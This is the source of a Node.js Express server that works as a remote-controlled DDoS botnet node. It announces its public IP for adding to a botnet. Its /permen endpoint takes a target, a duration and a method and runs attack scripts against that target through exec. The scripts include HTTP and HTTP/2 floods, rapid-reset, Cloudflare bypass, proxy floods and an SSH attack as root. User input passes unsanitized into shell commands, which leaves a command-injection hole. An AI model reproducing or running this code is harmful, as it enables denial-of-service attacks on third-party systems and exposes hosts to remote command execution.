const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

if (methods === 'hold') {
	console.log(`recieved`)
    exec(`node ./lib/cache/hold.js${target} ${time} 100 10`);
} else if (methods === 'glory') {
	console.log(`recieved`)
    exec(`node ./lib/cache/glory ${target} ${time} 100 20 proxy.txt `);
} else if (methods === 'bypass') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'https') {
	console.log(`recieved`)
    exec(`node ./lib/cache/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'flood') {
	console.log(`recieved`)
    exec(`node ./lib/cache/floodvip.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'mix') {
	console.log(`recieved`)
    exec(`node ./lib/cache/MIXBILL.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'h2') {
	console.log(`recieved`)
    exec(`node ./lib/cache/!H2-FLASH.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'rapid-reset') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
} else if (methods === 'sch') {
	console.log(`recieved`)
    exec(`node ./lib/cache/attacksch.js ${target} ${time} 100 10 proxy.txt`)
} else if (methods === 'overload') {
	console.log(`ya meteh`)
    exec(`node ./lib/cache/overload.js ${target} ${time} 100 10 proxy.txt`)
} else if (methods === 'ssh') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
} else if (methods === 'proxy') {
	console.log(`recieved`)
    exec(`node ./lib/cache/scrape.js`);
} else if (methods === 'panel') {
	console.log(`recieved`)
    exec(`node ./lib/cache/attackpanel2.js ${target} ${time} 100 10 proxy.txt`)
} else if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/cache/strike.js ${target} ${time} 100 10 proxy.txt`)
} else if (methods === 'bh') {
	console.log(`bh`)
    exec(`node ./lib/cache/behind-cloudflare.js ${target} ${time} 100 10 proxy.txt`)
} else {}
});
app.listen(port, () => {
fetchData()
});
